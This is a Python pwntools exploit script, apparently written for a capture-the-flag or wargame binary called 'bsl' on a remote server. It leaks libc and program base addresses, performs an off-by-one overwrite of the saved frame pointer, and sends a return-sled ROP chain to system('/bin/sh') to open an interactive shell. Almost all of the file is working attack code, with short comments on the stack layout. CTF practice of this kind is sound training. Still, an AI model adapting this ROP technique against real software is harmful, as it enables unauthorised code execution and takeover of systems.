#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

from pwn import *

# p = process("./bsl")
p = remote("plsdonthaq.me", 8001)

'''
:: most_fav
send - 0
fgets(arg1, 0x538, stdin) # Can't overwrite EBP in the current stack frame, but can in the parent frame!

:: least fav
LEAK: get_number
fgets(esp-0xd4, 0xd1, stdin) # Not enough!
'''

addr = dict()
offsets = dict(
    get_number = 0x713,
    puts=0x67b40,
    system=0x3d200,
    binsh=0x17e0cf,
    ret=0x4a6
)


p.sendlineafter("Will you be my friend? (y/n)", "y")
p.recvuntil("My current favourite is: ")
addr["libc_base"] = int(p.recvline(), 16) - offsets["puts"]
log.info(f"Got libc base leak :: {hex(addr['libc_base'])}")

# Fav number 1
p.sendline("y")
p.sendline("0")
p.sendline("")


# Least number
p.sendline("y")
p.recvuntil("Mine is: ")
addr["base"] = int(p.recvline(), 16) - offsets["get_number"]
log.info(f"Got base leak :: {hex(addr['base'])}")

p.sendline("0")
payload = b''
payload += b'.' * (0xd1-5)
ebx = addr["base"] + 0x2fb4 # Keep the value of ebx
payload += p32(ebx)
p.sendline(payload)
# Zero the LSB byte of ebp

# Spill fix, least fav
p.sendline("y")
p.sendline("0")
p.sendline("")

p.sendline("y")
p.sendline("0")

# Sometimes Santa doesn't give us our system(/bin/sh) present
# Probably needs some more RETs
payload = b'A'
payload += p32(addr["base"] + offsets["ret"]) * 0x120
payload += p32(addr["libc_base"] + offsets["system"])
payload += b'....'
payload += p32(addr["libc_base"] + offsets["binsh"])

p.sendline(payload)

''' 

fgets(ebp-0xd0, 0xd1)

|ebp+0x4|EIP
|ebp    | saved ebp
|ebp-0x4|ebx

'''

p.interactive()
